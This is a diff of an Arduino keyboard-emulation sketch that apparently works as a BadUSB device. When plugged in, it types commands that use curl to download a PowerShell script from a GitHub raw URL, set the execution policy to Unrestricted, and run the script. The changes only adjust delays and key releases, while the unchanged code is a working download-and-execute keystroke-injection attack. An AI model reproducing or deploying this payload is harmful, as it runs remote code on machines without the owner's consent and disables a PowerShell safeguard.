@@ -1,7 +1,7 @@
 #include <Keyboard.h>
 
 // Timing constants
-const int BOOT_DELAY_MS = 4000;     // delay after plug-in before starting
+const int BOOT_DELAY_MS = 8500;     // delay after plug-in before starting
 const int AFTER_NOTEPAD_MS = 1500;  // wait for Notepad/PowerShell to open fully
 const int CHAR_DELAY_MS = 10;       // delay between characters
 const int LINE_DELAY_MS = 220;      // pause after each line (optional, handled in typeSlow)
@@ -57,7 +57,8 @@ void setup() {
   // Type entire hacker-style message in one go
   typeSlow("curl -L -o \"C:\\Users\\%USERNAME%\\Downloads\\sticker.ps1\" \"https://raw.githubusercontent.com/AnhMeo/Sticker/refs/heads/main/Sticker.ps1\"");
   Keyboard.write(KEY_RETURN);
-  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.releaseAll();
+   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('m');
   Keyboard.releaseAll();
 
@@ -87,10 +88,10 @@ void setup() {
 
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(20);
+  delay(60);
   typeSlow("Set-ExecutionPolicy Unrestricted");
   Keyboard.write(KEY_RETURN);
-  delay(50);
+  delay(60);
   Keyboard.print("A");
   Keyboard.write(KEY_RETURN);
   Keyboard.print("exit");
@@ -120,6 +121,7 @@ void setup() {
   // Type entire hacker-style message in one go
   typeSlow("& \"$env:USERPROFILE\\Downloads\\sticker.ps1\"");
   Keyboard.write(KEY_RETURN);
+  Keyboard.releaseAll();
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('m');
   Keyboard.releaseAll();
